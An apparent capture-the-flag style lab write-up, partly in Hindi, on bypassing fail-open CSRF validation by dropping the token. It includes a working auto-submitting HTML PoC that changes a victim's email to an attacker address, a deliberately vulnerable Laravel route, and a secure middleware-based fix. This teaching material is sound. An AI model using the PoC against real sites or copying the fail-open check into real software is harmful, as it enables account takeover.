# 🔐 Lab: CSRF where token validation depends on token being present

---

# 🧪 1. HOW I SOLVED THE LAB

---

## 🔑 Step 1: Login

* Username: `wiener`
* Password: `peter`

---

## 🛰️ Step 2: Capture Request

```http
POST /my-account/change-email
Cookie: session=abc123

email=test@gmail.com&csrf=TOKEN123
```

---

## ❌ Step 3: Testing

* Change token → ❌ rejected
* Remove token → ✔️ accepted

---

## 💡 Step 4: Final Exploit Idea

👉 CSRF token completely remove kar diya

---

## 🧨 Step 5: Final PoC

```html
<html>
  <body>
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@gmail.com" />
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## ✅ Step 6: Result

✔️ Email changed
✔️ CSRF bypass successful

---

# 🧠 2. ROOT CAUSE

```php
if (csrf_token_present) {
    validate_csrf_token();
} else {
    process_request(); // ❌ fail-open
}
```

---

# 💻 3. VULNERABLE LARAVEL CODE

---

## ❌ Example (Misconfigured / Vulnerable)

```php
// routes/web.php
Route::post('/change-email', function (\Illuminate\Http\Request $request) {

    // ❌ Developer manually handling CSRF (WRONG)
    if ($request->has('csrf')) {
        if ($request->input('csrf') !== session('csrf_token')) {
            return "Invalid CSRF";
        }
    }

    // ❌ If token missing → request still allowed
    auth()->user()->email = $request->input('email');
    auth()->user()->save();

    return "Email changed";
});
```

---

## ❌ Blade Form (No @csrf)

```blade
<form method="POST" action="/change-email">
    <input type="email" name="email">
    <button type="submit">Change</button>
</form>
```

---

## 🚨 Why Vulnerable?

* CSRF token optional bana diya
* Missing token → validation skip
* Manual validation flawed

---

# 🛡️ 4. SECURE LARAVEL CODE

---

## ✔️ Proper Route (with middleware)

```php
Route::post('/change-email', function (\Illuminate\Http\Request $request) {

    auth()->user()->email = $request->input('email');
    auth()->user()->save();

    return "Email changed";

})->middleware('web'); // includes CSRF protection
```

---

## ✔️ Blade Form (Secure)

```blade
<form method="POST" action="/change-email">
    @csrf
    <input type="email" name="email">
    <button type="submit">Change</button>
</form>
```

---

## ✔️ Middleware (Auto Protection)

Laravel automatically:

* Generates CSRF token
* Validates token on every POST request
* Rejects request if token missing/invalid

---

# ⚡ 5. KEY TAKEAWAYS

* CSRF token must be **mandatory**
* Never implement custom CSRF logic
* Use framework protection (Laravel middleware)
* Missing token should always be rejected

---

# 🧠 6. INTERVIEW ONE-LINER

👉
**"The application used fail-open CSRF validation where the token was only verified if present. By removing the token entirely, I bypassed the protection and performed a CSRF attack."**

---
